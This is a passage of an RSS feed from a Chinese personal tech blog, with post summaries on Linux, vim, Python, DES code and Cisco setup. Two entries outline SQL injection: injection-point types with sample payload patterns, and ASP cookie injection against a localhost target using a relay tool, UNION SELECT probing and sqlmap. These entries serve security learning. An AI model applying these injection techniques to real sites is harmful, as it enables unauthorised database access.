总是经过的太快 领悟的太晚 我们要学会珍惜 珍惜人生路上的亲情、友情、同事情、同学情、朋友情 一旦擦身而过 也许永不邂逅</description>
    </item>
    
    <item>
      <title>Linux之权限(重点)</title>
      <link>http://wyb0.com/posts/linux-permission-settings/</link>
      <pubDate>Sun, 17 Apr 2016 10:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-permission-settings/</guid>
      <description>主要有三种参数：rwx 对于文件来说：分别是读/写/执行
对于目录来说：r读目录结构；w操作目录结构；x进入目录
如：drwxr&amp;ndash;r&amp;ndash; 3 root root 4096 Jun 25 08:35 .ssh
若账号vbird不属于root群组，则vbird可以查询此目录下的文件名，没有x权限所以不能切换到此目录中
文件权限  chmod -x [root@localhost tmp]# ls -l total 0 -rwxrwxrwx. 1 root root 0 Apr 16 20:32 a.txt [root@localhost tmp]# chmod -x a.txt 去除ugo的x权限 [root@localhost tmp]# ls -l total 0 -rw-rw-rw-. 1 root root 0 Apr 16 20:32 a.txt [root@localhost tmp]# ls -l a.txt -rwxrw-rw-. 1 root root 9 Apr 16 20:42 a.txt [root@localhost tmp]# cat a.</description>
    </item>
    
    <item>
      <title>Linux之vim</title>
      <link>http://wyb0.com/posts/linux-vim/</link>
      <pubDate>Fri, 15 Apr 2016 21:03:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/linux-vim/</guid>
      <description>Vim的安装及配置：  安装vim   yum install vim    配置文件的位置   在目录 /etc/ 下面，有个名为vimrc的 文件， 这是系统中公共的vim配置文件，对所有用户都有效。    设置语法高亮显示   1) 打开vimrc，添加以下语句来使得语法高亮显示： syntax on 2) 如果此时语法还是没有高亮显示，那么在/etc目录下的profile文件中添加以下语句： export TERM=xterm-color    设置Windows风格的C/C++自动缩进（添加以下set语句到vimrc中）   1）设置Tab为4个空格 set tabstop=4 # 设定tab长度为4 set softtabstop=4 # 使按退格键时可以一次删除4个空格 set shiftwidth=4 # 表示每一级缩进的长度，一般设置成跟softtabstop一样 set expandtab/noexpandtab # 缩进用空格/制表符表示 2）自动缩进 set autoindent/noautoindent # 设置每行的缩进值与上一行相等/不相等 3）使用 C/C++ 语言的自动缩进方式 set cindent 4）在左侧显示文本的行号 set nu 5）搜索设置 set incsearch # 输入搜索内容时就显示搜索结果 set hlsearch # 搜索时高亮显示被找到的文本 6）如果没有下列语句，就加上吧 if &amp;amp;term==&amp;quot;xterm&amp;quot; set t_Co=8 set t_Sb=^[[4%dm set t_Sf=^[[3%dm endif   Vim编辑器的三种模式  命令行模式   $vim 文件名 #直接进入命令行模式 Ctrl+ZZ# 可保存文件 5dd/4yy# 剪切5行/复制4行 p # 粘贴到当前行后面 u # 一直点的话会一直撤销，直到回复到文件最初状态 gg/G # 光标移动到首行/末行 H/M/L # 光标移动到屏幕显示的首行/中间/末行 0/$ # 光标移动到行首/行尾 w/b # 光标跳到下一个/上一个单词 o # 在下一行插入 Ctrl+g # 显示文本的信息 dt% # 删除所有内容直到遇到 % d0/d$或D # 删除从光标到行首/行尾的字符 3dw # 删除3个单词 v+方向键 # 可以从当前光标向各方向选择字符或行 4+向下的方向键 # 光标向下移动4行 /和？# 向下和向上搜索    末行模式   :wq # 推出并保存 :wq!</description>
    </item>
    
    <item>
      <title>Markdown简单语法</title>
      <link>http://wyb0.com/posts/markdown-coding-syle/</link>
      <pubDate>Tue, 12 Apr 2016 01:01:01 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/markdown-coding-syle/</guid>
      <description> 0x00 标题   0x01 列表   0x02 引用   0x03 图片和链接  网络图片引用：
![Mou icon](http://mouapp.com/Mou_128.png) 本地图片引用：
![Logo](/img/logo.png) 图片链接：
[![](http://wyb0.com/img/logo.png)](http://wyb0.com/img/logo.png) 
链接：
[百度一下](http://www.baidu.com &amp;quot;点击去百度&amp;quot;) 百度一下
自动链接：
&amp;lt;http://www.baidu.com&amp;gt; http://www.baidu.com
新标签打开(部分平台不识别)：
[百度一下](http://www.baidu.com){:target=&amp;quot;_blank&amp;quot;}
也可用{:width=&amp;ldquo;300&amp;rdquo; height=&amp;ldquo;100&amp;rdquo;}来设置图片大小(部分平台不识别)
 0x04 粗体与斜体   0x05 表格   0x06 代码块  行内代码块：使用两个Esc按键下的符号`将代码包裹起来即可
代码块：在代码左侧加4个空格即可(tab键缩进也行)  0x07 线   0x08 字体、字号和颜色设置   </description>
    </item>
    
    <item>
      <title>2016计划</title>
      <link>http://wyb0.com/posts/2016-plan/</link>
      <pubDate>Mon, 11 Apr 2016 15:46:07 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/2016-plan/</guid>
      <description> 4月到10月好好参加培训 </description>
    </item>
    
    <item>
      <title>Python的正则</title>
      <link>http://wyb0.com/posts/python-regular/</link>
      <pubDate>Fri, 05 Feb 2016 11:38:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-regular/</guid>
      <description> 正则表达式  正则表达式是用来匹配字符串的异常强大的东西，可以用来匹配邮箱、域名等字符串
 原子字符   元字符   修饰符   re模块  由于Pyton的字符串本身也用\转义，强烈建议使用r前缀
  函数match()
这个函数会尝试从字符串起始位置匹配一个模式，未匹配到则返回None  函数search()
这个函数会扫描整个字符串并返回第一个成功的匹配，未匹配到则返回None  函数findall()和finditer()
re.findall()将以列表的形式返回所有能匹配到的字符
re.finditer()将以迭代器的形式返回所有能匹配到的字符  函数sub()
这个函数会对字符串进行匹配，然后替换，可以指定替换次数  函数split()
这个函数会以正则来分割字符串，以列表样式返回  函数compile()
这个函数可以编译正则，提高匹配速度   提取子串  根据正则可以匹配字符然后提取出来，用括号表示要提取的分组  贪婪匹配  正则表达式默认贪婪匹配，会尽可能的多匹配字符，一般就是用&amp;rdquo;？&amp;rdquo;来抑制贪婪匹配  </description>
    </item>
    
    <item>
      <title>Python的线程</title>
      <link>http://wyb0.com/posts/python-thread/</link>
      <pubDate>Wed, 03 Feb 2016 12:44:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-thread/</guid>
      <description>Python的参数传递其实传递的是对象，当传递可变对象(列表、队列)时相当于引用传递，可以修改对象的原始值，当传递不可变对象(字符串、整型)时就相当于传值，不能直接修改原始对象。
单线程  #!/usr/bin/env python # -*- coding: utf-8 -*- from time import time,ctime,sleep def music(arg): for x in range(2): print &amp;quot;I&#39;m listening to %s. %s&amp;quot; % (arg,ctime()) sleep(1) def movie(arg): for x in range(2): print &amp;quot;I&#39;m watching %s. %s&amp;quot; % (arg,ctime()) sleep(5) if __name__ == &#39;__main__&#39;: start = int(time()) music(u&#39;我&#39;) movie(u&#39;可是&#39;) print &amp;quot;All over time:%s&amp;quot; % ctime() print &amp;quot;Used time:%d&amp;quot; % int(time()-start)   多线程  #!/usr/bin/env python # -*- coding: utf-8 -*- import re import requests import threading from time import time,ctime,sleep INDEX = 0 def http_get(sites): global INDEX while INDEX &amp;lt; len(sites): url = sites[INDEX] INDEX += 1 resp = requests.</description>
    </item>
    
    <item>
      <title>Python的IO操作</title>
      <link>http://wyb0.com/posts/python-io-operation/</link>
      <pubDate>Sun, 31 Jan 2016 12:27:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-io-operation/</guid>
      <description>文件的操作 文件读写  r读取；rb可以读取二进制文件(如图片、视频)；w可覆盖写入；a+可追加写入
#!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&amp;quot;test.txt&amp;quot;,&amp;quot;r&amp;quot;) data = f.read() print &amp;quot;File name: &amp;quot;,f.name print &amp;quot;File open moudle: &amp;quot;,f.mode print &amp;quot;File is close ?&amp;quot;,f.closed print &amp;quot;File content: &amp;quot;,data finally: f.close() with open(&amp;quot;test.txt&amp;quot;,&amp;quot;a+&amp;quot;) as f: #自动调用close() data = &amp;quot;\nYes,I know.&amp;quot; f.write(data) print u&amp;quot;写入内容：%s&amp;quot; % data with open(&amp;quot;test.txt&amp;quot;,&amp;quot;r&amp;quot;) as f: #readlines()一次读取一行，返回一个列表，也可以用read(size)读取指定大小 line = f.readlines() print line   指针移动  #!/usr/bin/env python # -*- coding: utf-8 -*- try: f = open(&amp;quot;test.</description>
    </item>
    
    <item>
      <title>Python的面向对象</title>
      <link>http://wyb0.com/posts/python-object-oriented/</link>
      <pubDate>Mon, 25 Jan 2016 11:17:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-object-oriented/</guid>
      <description>面向对象  面向对象是为了解决系统的可维护性，可扩展性，可重用性
 三个基本特征：封装、继承、多态
 封装：对一类事物，将其相同特点和功能提取出来，所共有的特点叫做属性，共有的功能就叫做方法，将属性和方法组合在一起就叫做封装。
如：人具有姓名、年龄、性别，这些就是属性，人可以说话、可以走、可以跑，这些就是方法，封装起来就是一个类，而类的实例化就是对象
 继承：继承可以使得子类具有父类的属性和方法，不需要再次编写相同的代码，子类可以对继承的代码进行重写，也可以追加新的属性和方法。
如：有一个类People，教师就可以继承自People，可以添加自己的属性，如：工资、职工号，也可以添加自己的方法，如：备课、写教案
 多态：首先，多态必有继承，没有继承就没有多态，继承后一个父类的引用变量可以指向其任意一个子类对象。
如：有一个People类，它的子类可以有学生、老师、工人，有多种形态，这就是多态
   类的实例  注意：类中每个方法后面都要写self，self就是当前对象指针
  示例一   #!/usr/bin/env python # -*- coding:utf-8 -*- # 声明一个People类 class People(object): &amp;quot;&amp;quot;&amp;quot;docstring for People&amp;quot;&amp;quot;&amp;quot; def __init__(self, name, age): super(People, self).__init__() self.name = name self.age = age def running(self): print &amp;quot;%s is running&amp;quot; % self.name def print_base_msg(self): print &amp;quot;Name:%s Age:%d&amp;quot; % (self.name,self.age) # 继承自People类 class Teacher(People): &amp;quot;&amp;quot;&amp;quot;docstring for Teacher&amp;quot;&amp;quot;&amp;quot; def __init__(self, name, age, salary): super(Teacher, self).</description>
    </item>
    
    <item>
      <title>Python的函数式编程</title>
      <link>http://wyb0.com/posts/python-functional-programming/</link>
      <pubDate>Thu, 21 Jan 2016 21:13:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-functional-programming/</guid>
      <description>函数式编程  首先说一下高阶函数，能将函数作为参数来接收的函数就可以称为高阶函数，如下：
def add(x,y,f): return f(x) + f(y) print add(7,-3,abs) #abs是求绝对值的函数，这里返回的值为10  将函数作为参数传入，这样的函数就是高阶函数，而函数式编程就是指这种抽象程度很高的编程范式。
函数式编程的一个特点就是可以将函数作为参数，还允许返回一个函数。
纯粹的函数式编程语言编写的函数没有变量，因此，任意一个函数，只要输入是确定的，输出就是确定的，这种纯函数我们称之为没有副作用。
允许使用变量的程序设计语言，由于函数内部的变量状态不确定，同样的输入，可能得到不同的输出，因此，这种函数是有副作用的。
 高阶函数  map()函数
map接收两个参数，一个是函数，一个是列表(list)，map将函数依次作用到list的每个元素，然后返回新的list   def f(x): return x*x print map(f,[1,2,3,4]) #返回[1,4,9,16] print map(str,[1,2,3,4]) # 返回[&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;]    reduce()函数
reduce接收参数和map一样(但传入的函数必须接收两个参数)，reduce会对list的每个元素反复调用函数，然后返回最终值   def f(x,y): return x*y print reduce(f,[1,2,3,4]) #1*2*3*4，返回24    filter()函数
filter也接收函数和list，函数会对list的每个元素进行判断然后返回True或False，为True的组成新list返回   def f(x): return x &amp;gt; 3 print filter(f,[1,2,3,4,5]) #返回[4,5]    sorted()函数</description>
    </item>
    
    <item>
      <title>Python的数据类型</title>
      <link>http://wyb0.com/posts/python-type-of-data/</link>
      <pubDate>Tue, 19 Jan 2016 13:47:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-type-of-data/</guid>
      <description>0x00 特点及差别  常见4种数据类型：list、tuple、dict、set list即列表，它内部是有序的，可以添加、更新、删除元素 tuple是元组，它的内部也是有序的，但一般不可更新、删除，即内部元素不可变 dict即字典，它的内部无序，key不可变、不可重复，key值可更新，可删除键值对 set可用作求交集、并集等，它的内部无序，key不可变、不可重复，可添加和删除   0x01 操作示例  #!/usr/bin/env python # -*- coding: utf-8 -*- ####################################### print &#39;-----list-----&#39; L = [] #这样就可以声明一个list了 n = 1 while n &amp;lt;= 9: L.append(n) #添加 n = n + 2 print L #[1,3,5,7,9] L[len(L)-1] = 11 #更新 print L #[1,3,5,7,11] L.pop() #删除,和L.pop(-1)一样 L.pop(-2) print L #[1,3,7] L.insert(1,&#39;jack&#39;) for x in range(len(L)): print L[x], #逗号可抑制换行，结果为 1 jack 3 7 print &#39;\n-----list-----\n&#39; ####################################### print &#39;-----tuple-----&#39; T =(&#39;Michael&#39;,&#39;Bob&#39;,&#39;Tracy&#39;) print T #[&#39;Michael&#39;, &#39;Bob&#39;, &#39;Tracy&#39;] for x in range(len(T)): print T[x], # Michael Bob Tracy print &#39;\n-----tuple-----\n&#39; ####################################### print &#39;-----dict-----&#39; D = {&#39;Adam&#39;:95,&#39;Lisa&#39;:90,&#39;Bart&#39;:75} print D #{&#39;Lisa&#39;: 90, &#39;Adam&#39;: 95, &#39;Bart&#39;: 75} D[&#39;Lisa&#39;] = 99 #更新 D[&#39;Kongming&#39;] = &#39;X&#39; #添加 print D #{&#39;Lisa&#39;: 99, &#39;Kongming&#39;: &#39;X&#39;, &#39;Adam&#39;: 95, &#39;Bart&#39;: 75} D.</description>
    </item>
    
    <item>
      <title>各种参数类型注入</title>
      <link>http://wyb0.com/posts/various-parameter-types-injected/</link>
      <pubDate>Sun, 20 Dec 2015 20:08:47 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/various-parameter-types-injected/</guid>
      <description>分类  根据注入时提交的变量参数类型，SQL注入点有不同的分类，不同的注入点，其注入时需要注意的事项也有所不同。按提交参数类型，SQL注入点主要分为下面3种：即数字型注入点、字符型注入点和搜索型注入点
 数字型注入点  形如&amp;rdquo;http://www.xxx.com/a.asp?ID=55&amp;quot; ，这类注入的参数是&amp;rdquo;数字&amp;rdquo;，因此称为&amp;rdquo;数字型注入点&amp;rdquo;。 此类注入点提交的SQL语句，其原形大致为：select * from 表名 where 字段=55
当提交&amp;rdquo;http://www.xxx.com/a.asp?ID=55 And [查询条件]&amp;ldquo;时，向数据库提交的完整SQL语句为：
select * from 表名 where 字段=55 and [查询条件]
 字符型注入点  形如&amp;rdquo;http://www.xxx.com/a.asp?Class=0123&amp;quot;这类注入的参数是&amp;quot;字符&amp;quot;，称为&amp;quot;字符型&amp;quot;注入点。
此类注入点提交的 SQL 语句，其原形大致为：
select * from 表名 where 字段=&amp;lsquo;日期&amp;rsquo;
当提交&amp;rdquo;http://www.xxx.com/a.asp?Class=日期 And [查询条件]&amp;ldquo;时，向数据库提交的SQL语句为：
select * from 表名 where 字段=&amp;lsquo;日期&amp;rsquo; and [查询条件]
 搜索型注入点  这是一类特殊的注入类型。
这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有&amp;rdquo;keyword=关键字&amp;rdquo;，有的不显示的链接地址，而是直接通过搜索框表单提交。
此类注入点提交的 SQL 语句，其原形大致为：
select * from 表名 where 字段 like &amp;lsquo;%关键字%&amp;rsquo;
当我们提交注入参数为&amp;rdquo;keyword=&amp;lsquo;and[查询条件] and &amp;lsquo;%&amp;rsquo;=&amp;lsquo;,则向数据库提交的完整SQL语句为：
select * from 表名 where 字段 like &amp;lsquo;%&amp;rsquo; and [查询条件] and &amp;lsquo;%&amp;rsquo;=&amp;lsquo;%&amp;rsquo;</description>
    </item>
    
    <item>
      <title>ASP简单Cookie注入</title>
      <link>http://wyb0.com/posts/cookie-injection-of-asp/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/cookie-injection-of-asp/</guid>
      <description> Cookie注入的使用  三大Web提交方式
 GET：直接在浏览器上面访问地址
 POST：提交表单(会员注册、文件上传等)
 COOKIE：访问网站下面自带的身份验证的值  Cookie注入利用时机
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。  利用方法
 可以利用注入中转 可以利用sqlmap   用注入中转进行Cookie注入  目标：http://localhost:81/2/shownews.asp?id=183
 打开注入中转这个工具，填入相应参数，然后点击生成ASP，将生成的asp文件(jmCook.asp)放入你自己搭建的网站内后即可进行注入  提交localhost:81/jmCook.asp?jmdcw=183 order by猜测字段数
 提交localhost:81/jmCook.asp?jmdcw=183 UNION SELECT 1,2,3,4 from XXX猜测表名  猜测内容   用sqlmap进行Cookie注入  sqlmap验证存在Cookie注入  猜表名  猜列名  猜字段内容   </description>
    </item>
    
    <item>
      <title>搭建DNS服务器</title>
      <link>http://wyb0.com/posts/set-up-dns-server/</link>
      <pubDate>Tue, 14 Jul 2015 14:15:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/set-up-dns-server/</guid>
      <description> 环境  虚拟机rhel-server-6.2
 搭建流程  安装DNS服务器 配置DNS主配置文件 配置DNS正反向解析区域数据文件 启动DNS服务器进行测试  安装DNS服务  挂载光盘
用mount -o,loop /dev/cdrom /mnt/cdrom命令挂载光盘
 配置yum源，安装BIND(用命令yum install bind*安装) 安装结果如下：  进行配置
vim /etc/named.conf,添加必要的信息 在named.conf的包含文件named.rfc1921.zones中定义区域  配置正反向解析文件
分别配置wyb.cn.hosts和wyb.cn.rev   验证  用service named start命令启动DNS
用nslookup命令进行验证，先查看当前采用那台DNS解析，测试反向资源记录以及正反向解析  </description>
    </item>
    
    <item>
      <title>中小企业网络搭建</title>
      <link>http://wyb0.com/posts/small-and-medium-enterprise-network-structures/</link>
      <pubDate>Mon, 13 Jul 2015 13:53:56 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/small-and-medium-enterprise-network-structures/</guid>
      <description>中小企业需求分析  搭建企业私有局域网络环境，使用交换机、路由器等网络设备完成由局域网到互联网的接入。 对网络设备能够方便地进行远程管理。 在局域网中公司部门间进行vlan划分，实现安全管理。 对三层设备路由技术这方面采取RIPV2协议或OSPF协议。 配置访问控制列表（ACL）以对网络数据进行有效的分类和控制，限制终端之间的相互访问。 内网通过配置PAT技术实现与外网之间的通信。  所需设备   网络规划  在三层交换机设置ACL，控制个vlan间的通信 在防火墙(路由器)上设置NAT转换 路由协议采用OSPF 内网访问控制  内网中只有市场部可以访问外网 市场部可以访问市场部、打印机 设计部可以访问设计部、财务部、打印机 外网只有202.202.2.0/24能访问内网  IP规划如下：  打印机：192.168.1.0/24 市场部：192.168.2.0/24 设计部：192.168.3.0/24 财务部：192.168.4.0/24 防火墙和三层交换机所在网段：192.168.5.0/24 管理ip所在网段：192.168.100.0/24   网络设备配置命令代码  Firewall配置   Router&amp;gt;enable Router#conf t Router(config)#no ip domain-lookup //禁止域名解析 Router(config)#hostname Firewall //更改设备名 Firewall(config)#enable password 123 Firewall(config)#router eigrp 1 Firewall(config-router)#no auto-summary //关闭自动汇总 Firewall(config-router)#exit Firewall(config)#int f0/0 Firewall(config-if)#ip add 192.168.5.2 255.255.255.0 //配端口ip Firewall(config-if)#no shut Firewall(config-if)#exit Firewall(config)#router ospf 1 //配路由协议ospf Firewall(config-router)#network 202.</description>
    </item>
    
    <item>
      <title>单重DES的简单实现</title>
      <link>http://wyb0.com/posts/single-des-simple-implementation/</link>
      <pubDate>Fri, 22 May 2015 16:52:55 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/single-des-simple-implementation/</guid>
      <description>简介  此程序通过单重des实现8个字节的加密和解密。 新建一个工程，这个工程需要3个cpp文件(c文件也可以)和2个头文件。 cpp文件：main.cpp、des.cpp、status.cpp 头文件：des.h、status.h   代码  以下为主函数main.cpp的内容：   #include &amp;lt;stdio.h&amp;gt; #include &amp;quot;status.h&amp;quot; #include &amp;quot;des.h&amp;quot; int main() { char M[8],Key[9]; printf(&amp;quot;Input Plaintext :&amp;quot;); scanf(&amp;quot;%s&amp;quot;,&amp;amp;M); printf(&amp;quot;Input Key :&amp;quot;); scanf(&amp;quot;%s&amp;quot;,&amp;amp;Key); SetKey(Key);//生成16个子秘钥 printf(&amp;quot;加密：&amp;quot;); Des(M,&#39;e&#39;); printf(&amp;quot;%s\n&amp;quot;,M); printf(&amp;quot;解密：&amp;quot;); Des(M,&#39;d&#39;); printf(&amp;quot;%s\n&amp;quot;,M); return 0; }    以下为des.cpp的内容：   #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;quot;status.h&amp;quot; #include &amp;quot;des.h&amp;quot; void ByteToBit(const char *In,bool *Out,int bits) { for (int j=0;j&amp;lt;bits;j++) Out[j]=(In[j/8]&amp;gt;&amp;gt;(j%8))&amp;amp; 1; } void BitToByte(bool *In,char *Out,int bits) { memset(Out,0,(bits+7)/8); for (int k=0;k&amp;lt;bits;k++) Out[k/8]|=In[k]&amp;lt;&amp;lt;(k%8); } void Transform(bool *Y,bool *X,const char *Table,int len) { for (int l=0;l&amp;lt;len;l++) Temp[l]=X[Table[l]-1]; memcpy(Y,Temp,len); } void Des(char *m,char ch) { bool Tem[32]; ByteToBit(m,P,64); Transform(P,P,IP1_Table,64); Li=&amp;amp;P[0]; Ri=&amp;amp;P[32]; if (ch==&#39;e&#39;) { for (i=0;i&amp;lt;16;i++) { memcpy(Tem,Ri,32);//临时存放明文的右半部分 f(Ri,SubKey[i]); XOR(Ri,Li,32); memcpy(Li,Tem,32);//将明文的右半部分写入Li } } else { for (i=15;i&amp;gt;=0;i--) { memcpy(Tem,Li,32);//临时存放明文的右半部分 f(Li,SubKey[i]); XOR(Li,Ri,32); memcpy(Ri,Tem,32);//将明文的右半部分写入Li } } Transform(P,P,IP2_Table,64); BitToByte(P,m,64); } void f(bool *R,bool *k) { bool T[48]; Transform(T,R,E_Table,48);//32位的Ri扩展为48位 XOR(T,k,48);//Ri和轮秘钥的异或 S_Box_f(T,R); Transform(R,R,P_Table,32); } void XOR(bool *R,bool *k,int len) { for (int m=0;m&amp;lt;len;m++) R[m]=R[m]^k[m]; } void S_Box_f(bool *B,bool *C) { int a,b; for (int k=0;k&amp;lt;8;k++) { a=B[0]*2+B[5]; b=B[1]*8+B[2]*4+B[3]*2+B[4]; ByteToBit(&amp;amp;S_Box[k][a][b],C,4); B+=6; C+=4; } } //以下求得子秘钥 void SetKey(char *KEY) { ByteToBit(KEY,K,64); Transform(K,K,PC1_Table,56); printf(&amp;quot;\n\n\n&amp;quot;); Ci=&amp;amp;K[0]; Di=&amp;amp;K[28]; for (int j=0;j&amp;lt;16;j++) { MovKey(Ci,28,LOOP_Table[j]); MovKey(Di,28,LOOP_Table[j]); Transform(SubKey[j],K,PC2_Table,48); } } void MovKey(bool *LR,int len,int loop) { memcpy(Temp,LR,loop); memcpy(LR,LR+loop,len-loop); memcpy(LR+len-loop,Temp,loop); }    以下为status.</description>
    </item>
    
    <item>
      <title>思科交换机基本配置</title>
      <link>http://wyb0.com/posts/cisco-switch-basic-configuration/</link>
      <pubDate>Wed, 06 May 2015 23:46:26 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/cisco-switch-basic-configuration/</guid>
      <description>简单配置命令  Switch&amp;gt;enable(配置交换机名称) Switch(config)#hostname S S(config)#enable password 222//(加密特权密码，密码为222) S(config)#no enable password //(取消enable密码) S(config)#enable secret 333//(设置后用show命令时不能看到密码) S(config)#no enable secret //(取消enable密码) S(config)#line vty 0 4//(有5个虚拟终端，即0-4) S(config-line)#password 444//(设置虚拟终端密码) S(config-line)#login//(使密码生效) S(config)#line console 0//(设置控制台密码) S(config-line)#password 111 S(config-line)#login S(config)#line con 0//(取消控制台密码) S(config-line)#no password S(config-line)#exec-timeout 5 30//(超时时间)(分、秒) S(config)#no ip domain-lookup//(禁止名称解析)   配置交换机管理IP、默认网关  S(config)#interface vlan 1 //(配置交换机管理IP、子网掩码) S(config-if)#ip address 192.168.1.1 255.255.255.0 S(config-if)#no shutdown S(config)# exit S(config)#ip default-gateway 192.168.1.250//(默认网关)   配置交换机的端口速率、端口双工模式  S(config)#//(端口双工模式) S(config)#interface f0/1 S(config-if)#duplex ?</description>
    </item>
    
  </channel>
</rss>